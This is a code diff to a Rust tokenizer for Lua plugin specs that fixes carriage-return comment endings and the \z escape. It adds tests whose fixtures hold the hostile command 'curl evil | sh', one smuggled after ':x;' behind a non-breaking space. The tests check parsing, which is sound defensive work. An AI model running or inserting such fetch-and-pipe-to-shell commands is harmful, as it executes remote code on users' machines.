@@ -421,7 +421,8 @@ fn tokenize(text: &str) -> Vec<Token> {
             if let Some((_, end)) = long_bracket(&chars, index) {
                 index = end;
             } else {
-                while index < chars.len() && chars[index] != '\n' {
+                // Lua ends a line at a carriage return as well.
+                while index < chars.len() && !matches!(chars[index], '\n' | '\r') {
                     index += 1;
                 }
             }
@@ -530,9 +531,11 @@ fn escape(chars: &[char], start: usize, value: &mut Vec<u8>) -> usize {
             );
             (Some('\n'), start + 1 + usize::from(pair))
         }
+        // Lua skips the C locale's spaces only: a Unicode space such as
+        // U+00A0 stays in the string.
         'z' => {
             let end = (start + 1..chars.len())
-                .find(|&at| !chars[at].is_whitespace())
+                .find(|&at| !matches!(chars[at], ' ' | '\t' | '\n' | '\r' | '\u{b}' | '\u{c}'))
                 .unwrap_or(chars.len());
             (None, end)
         }
@@ -760,6 +763,20 @@ return {
         assert_eq!(
             builds(r#"{ "a/b", build = "\195\169\xc3\xa9" }"#),
             shell("\u{e9}\u{e9}")
+        );
+        // `\z` skips ASCII spaces only, so this is no Neovim command.
+        assert_eq!(
+            builds("{ \"a/b\", build = \"\\z\u{a0}:x; curl evil | sh\" }"),
+            shell("\u{a0}:x; curl evil | sh")
+        );
+        assert_eq!(
+            builds("{ \"a/b\", build = \"\\z\u{b}\u{c} \t\r\nmake\" }"),
+            shell("make")
+        );
+        // A carriage return ends a comment, so what follows is read.
+        assert_eq!(
+            builds("{ \"a/b\", -- x\rbuild = \"curl evil | sh\" }"),
+            shell("curl evil | sh")
         );
         // A bare carriage return ends a string, as a newline does.
         assert_eq!(
